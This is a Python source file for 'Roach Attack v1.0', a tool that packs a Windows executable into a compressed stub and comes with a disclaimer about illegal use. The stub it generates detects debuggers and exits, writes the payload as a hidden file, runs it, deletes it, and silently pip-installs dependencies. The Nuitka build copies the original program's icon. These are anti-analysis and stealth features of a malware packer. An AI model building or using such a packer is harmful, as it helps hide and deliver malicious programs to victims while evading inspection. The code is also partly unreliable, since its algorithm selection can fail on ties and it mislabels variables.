import zlib
import lzma
import gzip
import bz2
import tqdm
import snappy
import zstandard
import lz4.frame
import sys
import shutil
import os
import py_compile
from pathlib import Path
import brotli

print('     Roach Attack v1.0\n\n     By KDSS-Research\n\n     Im not responsible for any illegal actions with that tool!')
path = input('\nEnter EXE path: ')
if not os.path.exists(path):
    print('File not exists!')
    input()
    exit()

memory = open(path,'rb').read()

print('Choosing the best compression algorithm...')
for i in tqdm.tqdm(range(7)):
    if i == 0:
        zlibcompr = zlib.compress(memory)
    elif i == 1:
        lzmacompr = brotli.compress(memory)
    elif i == 2:
        gzipcompr = gzip.compress(memory)
    elif i == 3:
        bz2compr = bz2.compress(memory)
    elif i == 4:
        snappycompr = snappy.compress(memory)
    elif i == 5:
        zstdcompr = zstandard.compress(memory)
    elif i == 6:
        lz4compr = lz4.frame.compress(memory)
if sys.getsizeof(zlibcompr) < sys.getsizeof(lzmacompr) and sys.getsizeof(zlibcompr) < sys.getsizeof(gzipcompr) and sys.getsizeof(zlibcompr) < sys.getsizeof(bz2compr) and sys.getsizeof(zlibcompr) < sys.getsizeof(snappycompr) and sys.getsizeof(zlibcompr) < sys.getsizeof(zstdcompr) and sys.getsizeof(zlibcompr) < sys.getsizeof(lz4compr):
    print('Choosed! ZLIB')
    bst = 'zlib'
if sys.getsizeof(lzmacompr) < sys.getsizeof(zlibcompr) and sys.getsizeof(lzmacompr) < sys.getsizeof(gzipcompr) and sys.getsizeof(lzmacompr) < sys.getsizeof(bz2compr) and sys.getsizeof(lzmacompr) < sys.getsizeof(snappycompr) and sys.getsizeof(lzmacompr) < sys.getsizeof(zstdcompr) and sys.getsizeof(lzmacompr) < sys.getsizeof(lz4compr):
    print('Choosed! Brotli')
    bst = 'brotli'
if sys.getsizeof(gzipcompr) < sys.getsizeof(zlibcompr) and sys.getsizeof(gzipcompr) < sys.getsizeof(lzmacompr) and sys.getsizeof(gzipcompr) < sys.getsizeof(bz2compr) and sys.getsizeof(gzipcompr) < sys.getsizeof(snappycompr) and sys.getsizeof(gzipcompr) < sys.getsizeof(zstdcompr) and sys.getsizeof(gzipcompr) < sys.getsizeof(lz4compr):
    print('Choosed! GZIP')
    bst = 'gzip'
if sys.getsizeof(bz2compr) < sys.getsizeof(zlibcompr) and sys.getsizeof(bz2compr) < sys.getsizeof(gzipcompr) and sys.getsizeof(bz2compr) < sys.getsizeof(lzmacompr) and sys.getsizeof(bz2compr) < sys.getsizeof(snappycompr) and sys.getsizeof(bz2compr) < sys.getsizeof(zstdcompr) and sys.getsizeof(bz2compr) < sys.getsizeof(lz4compr):
    print('Choosed! BZ2')
    bst = 'bz2'
if sys.getsizeof(snappycompr) < sys.getsizeof(zlibcompr) and sys.getsizeof(snappycompr) < sys.getsizeof(gzipcompr) and sys.getsizeof(snappycompr) < sys.getsizeof(bz2compr) and sys.getsizeof(snappycompr) < sys.getsizeof(lzmacompr) and sys.getsizeof(snappycompr) < sys.getsizeof(zstdcompr) and sys.getsizeof(snappycompr) < sys.getsizeof(lz4compr):
    print('Choosed! SNAPPY')
    bst = 'snappy'
if sys.getsizeof(zstdcompr) < sys.getsizeof(zlibcompr) and sys.getsizeof(zstdcompr) < sys.getsizeof(gzipcompr) and sys.getsizeof(zstdcompr) < sys.getsizeof(bz2compr) and sys.getsizeof(zstdcompr) < sys.getsizeof(snappycompr) and sys.getsizeof(zstdcompr) < sys.getsizeof(lzmacompr) and sys.getsizeof(zstdcompr) < sys.getsizeof(lz4compr):
    print('Choosed! zstandard')
    bst = 'zstd'
if sys.getsizeof(lz4compr) < sys.getsizeof(zlibcompr) and sys.getsizeof(lz4compr) < sys.getsizeof(gzipcompr) and sys.getsizeof(lz4compr) < sys.getsizeof(bz2compr) and sys.getsizeof(lz4compr) < sys.getsizeof(snappycompr) and sys.getsizeof(lz4compr) < sys.getsizeof(zstdcompr) and sys.getsizeof(lz4compr) < sys.getsizeof(lzmacompr):
    print('Choosed! LZ4')
    bst = 'LZ4'
print('! Choose mode\n1. PYC (better compression 11kb -> 5,32kb) (NEED INSTALLED PYTHON)\n2. EXE (11kb -> 266kb) (PORTABLE)')
mod = input('> ')
print('Creating code...')
if mod == "1":
    if bst == 'zlib':
        comp = 'import zlib;import os;\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(zlib.decompress('+str(zlibcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'brotli':
        comp = 'import os\ntry:import brotli\nexcept:os.system("python -m pip install Brotli");import brotli\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(brotli.decompress('+str(lzmacompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'gzip':
        comp = 'import gzip;import os;\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(gzip.decompress('+str(gzipcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'bz2':
        comp = 'import bz2;import os;\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(bz2.decompress('+str(bz2compr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'snappy':
        comp = 'import os\ntry:import snappy\nexcept:os.system("python -m pip install python-snappy");import snappy\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(snappy.decompress('+str(snappycompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'zstd':
        comp = 'import os\ntry:import zstandard\nexcept:os.system("python -m pip install zstandard");import zstandard\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(zstandard.decompress('+str(zstdcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'LZ4':
        comp = 'import os\ntry:import lz4.frame\nexcept:os.system("python -m pip install lz4");import lz4.frame\ntry:import win32con, win32api\nexcept:os.system("python -m pip install pywin32");import win32con, win32api\nfrom ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(lz4.frame.decompress('+str(lz4compr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
elif mod == "2":
    if bst == 'zlib':
        comp = 'import zlib;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(zlib.decompress('+str(zlibcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'brotli':
        comp = 'import brotli;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(brotli.decompress('+str(lzmacompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'gzip':
        comp = 'import gzip;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(gzip.decompress('+str(gzipcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'bz2':
        comp = 'import bz2;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(bz2.decompress('+str(bz2compr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'snappy':
        comp = 'import snappy;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(snappy.decompress('+str(snappycompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'zstd':
        comp = 'import zstandard;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(zstandard.decompress('+str(zstdcompr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
    if bst == 'LZ4':
        comp = 'import lz4.frame;import os;import win32con, win32api;from ctypes import *;\nif (windll.kernel32.IsDebuggerPresent()):\n   print("Debugger detected!");exit();\nopen("_'+str(Path(path))+'","wb").write(lz4.frame.decompress('+str(lz4compr)+'));win32api.SetFileAttributes("_'+str(Path(path))+'",win32con.FILE_ATTRIBUTE_HIDDEN);os.system("_'+str(Path(path))+'");os.remove("_'+str(Path(path))+'")'
else:
    print('Unknown mode!')
    input()
    exit()


open('_temp.py','w').write(comp)

if mod == "1":
    print('Compiling...')
    py_compile.compile('_temp.py')
    for file2 in os.listdir("./__pycache__"):
        shutil.move(f"./__pycache__/{file2}", str(Path(path)).replace('.exe','')+'_packed.pyc')
    os.rmdir('./__pycache__')
elif mod == "2":
    print('Compiling...')

    os.system('python -m nuitka _temp.py --windows-icon-from-exe="'+path+'"')
    try:
        os.remove('_temp.cmd')
    except:
        pass
    try:
        os.rename('_temp.exe',str(Path(path)).replace('.exe','')+'_packed.exe')
    except:
        os.remove(str(Path(path)).replace('.exe','')+'_packed.exe')
        os.rename('_temp.exe',str(Path(path)).replace('.exe','')+'_packed.exe')
    shutil.rmtree('_temp.build')
else:
    print('Unknown mode!')
    input()
    exit()
    
print('Cleaning temp...')


#os.remove('_temp.py')

print('Work completed!')
input()